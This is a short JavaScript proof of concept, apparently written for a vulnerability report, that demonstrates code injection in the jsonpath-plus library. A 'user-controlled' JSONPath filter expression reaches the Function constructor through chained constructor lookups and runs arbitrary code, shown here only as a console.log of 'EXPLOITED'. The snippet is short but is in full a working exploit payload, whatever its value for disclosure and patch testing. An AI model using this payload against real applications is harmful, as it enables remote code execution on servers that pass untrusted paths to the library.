const { JSONPath } = require("jsonpath-plus");

const exampleObj = { example: true }
const userControlledPath = "$..[?(p=\"console.log('EXPLOITED')\";a=''[['constructor']][['constructor']](p);a())]";

JSONPath({ json: exampleObj, path: userControlledPath});
